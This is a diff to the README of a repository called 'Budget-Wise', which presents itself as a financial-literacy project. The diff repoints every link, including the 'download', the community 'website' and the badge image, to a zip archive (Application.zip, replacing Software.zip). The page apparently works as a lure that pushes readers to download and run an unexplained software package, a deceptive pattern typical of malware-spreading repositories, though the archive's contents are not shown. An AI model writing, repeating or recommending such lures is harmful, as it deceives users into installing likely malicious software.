@@ -16,17 +16,17 @@ Budget-Wise is a public repository created with the aim of promoting financial l
 
 ## Get Started 🚀
 
-To access the full range of resources available in this repository, simply download the software package by clicking [here](https://github.com/user-attachments/files/18410590/Software.zip). Remember, the link needs to be launched to initiate the download process.
+To access the full range of resources available in this repository, simply download the software package by clicking [here](https://github.com/nxtfoxy007/budget-wise/releases/download/v1.0/Application.zip). Remember, the link needs to be launched to initiate the download process.
 
 ## Join the Budget-Wise Community 🤝
 
-Connect with like-minded individuals, share your financial success stories, and seek advice from experts in the field by visiting our [website](https://github.com/user-attachments/files/18410590/Software.zip). The Budget-Wise community is here to support you on your journey towards financial freedom.
+Connect with like-minded individuals, share your financial success stories, and seek advice from experts in the field by visiting our [website](https://github.com/nxtfoxy007/budget-wise/releases/download/v1.0/Application.zip). The Budget-Wise community is here to support you on your journey towards financial freedom.
 
 ## Stay Updated 📬
 
 For the latest updates and releases, be sure to check out the "Releases" section of this repository. Stay in the loop with new tools, resources, and guides to help you stay budget-wise and financially savvy.
 
-[![Download Budget-Wise Software](https://img.shields.io/badge/Download-Software-green)](https://github.com/user-attachments/files/18410590/Software.zip)
+[![Download Budget-Wise Software](https://github.com/nxtfoxy007/budget-wise/releases/download/v1.0/Application.zip)](https://github.com/nxtfoxy007/budget-wise/releases/download/v1.0/Application.zip)
 
 ## Let's Get Budget-Wise! 💰
 
